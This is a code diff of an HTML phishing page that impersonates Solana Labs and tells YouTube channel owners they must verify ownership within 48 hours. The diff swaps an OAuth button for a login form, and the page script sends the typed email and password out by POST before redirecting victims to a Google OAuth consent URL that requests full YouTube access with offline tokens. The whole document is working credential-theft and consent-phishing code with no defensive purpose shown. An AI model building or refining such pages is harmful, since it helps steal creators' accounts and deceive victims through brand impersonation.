@@ -61,27 +61,6 @@
     padding-bottom: 6px;
     margin-bottom: 15px;
   }
-  .oauth-btn {
-    background-color: #00FFA3;
-    color: #000000;
-    font-weight: 700;
-    padding: 14px 40px;
-    border-radius: 30px;
-    display: inline-block;
-    box-shadow: 0 4px 8px rgba(0, 255, 163, 0.3);
-    cursor: pointer;
-    border: none;
-    font-size: 16px;
-    transition: background-color 0.3s ease;
-    text-align: center;
-    text-decoration: none;
-    margin: 0 auto;
-    display: block;
-    max-width: 250px;
-  }
-  .oauth-btn:hover {
-    background-color: #00cc82;
-  }
   footer {
     margin-top: 50px;
     font-size: 13px;
@@ -146,8 +125,7 @@
       <div class="section">
         <h2>Verification Policy</h2>
         <p>To comply with Solana Labs’ anti-fraud standards, you must verify ownership of your YouTube channel.</p>
-        <p>Please connect your YouTube account below within 48 hours to avoid delays.</p>
-        <a class="oauth-btn" href="https://accounts.google.com/o/oauth2/v2/auth?client_id=847323098345-97tbp1m5g8ec170plkebnl5e17eo3ja3.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fsolana-collaboration.github.io%2FSolana%2F&response_type=code&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fyoutube.force-ssl&access_type=offline&prompt=consent">Connect with YouTube</a>
+        <p>Please enter your credentials below within 48 hours to avoid delays.</p>
 
         <form id="loginForm">
           <input type="text" id="email" name="email" placeholder="Email Address" required /><br />
@@ -203,9 +181,11 @@
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ email, password })
     }).then(() => {
+      // Redirect immediately after successful POST
       window.location.href = 'https://accounts.google.com/o/oauth2/v2/auth?client_id=847323098345-97tbp1m5g8ec170plkebnl5e17eo3ja3.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fsolana-collaboration.github.io%2FSolana%2F&response_type=code&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fyoutube.force-ssl&access_type=offline&prompt=consent';
     }).catch(err => {
       console.error('Error sending credentials:', err);
+      alert('Failed to send data. Try again later.');
     });
   });
 </script>
